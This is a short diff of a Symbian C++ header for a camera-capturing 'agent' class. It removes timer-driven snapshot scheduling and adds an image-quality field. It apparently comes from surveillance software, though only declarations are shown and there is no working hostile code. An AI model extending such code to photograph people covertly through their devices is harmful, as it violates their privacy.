@@ -12,7 +12,6 @@
 
 #include "AbstractAgent.h"
 
-#include <HT\TimeOutTimer.h>
 #include <ecam.h>
 #include <ImageConversion.h>
 
@@ -31,7 +30,7 @@ enum TEngineState
  *  CAgentCamera
  * 
  */
-class CAgentCamera : public CAbstractAgent, public MTimeOutNotifier, public MCameraObserver
+class CAgentCamera : public CAbstractAgent, public MCameraObserver
 	{
 public:
 	// Constructors and destructor
@@ -57,9 +56,7 @@ protected:
 	virtual void StopAgentCmdL();
 		
 private:
-	// From MTimeOutNotifier
-    virtual void TimerExpiredL(TAny* src);
-    // From MCameraObserver
+	// From MCameraObserver
     virtual void ReserveComplete(TInt aError);
     virtual void PowerOnComplete(TInt aError);
     virtual void ViewFinderFrameReady(CFbsBitmap &aFrame);
@@ -93,10 +90,6 @@ private:
 	void ConstructL(const TDesC8& params);
 
 private:
-	CTimeOutTimer* 			iTimer;
-	TTimeIntervalSeconds 	iSecondsInterv;  	// interval among two snapshots
-	TInt32					iNumStep;			// number of required snapshots
-	TInt32					iPerformedStep;		// number of performed step
 	CCamera*				iCamera;
 	TInt					iNumCamera;			// number of device camera
 	TInt					iCameraIndex;		// 0=rear camera; 1=front camera
@@ -106,6 +99,7 @@ private:
 	TInt					iSizeIndex;
 	TSize					iLandscapeSize;
 	CFbsBitmap*             iBitmapSave;
+	TInt					iQuality; 					
 	};
 
 
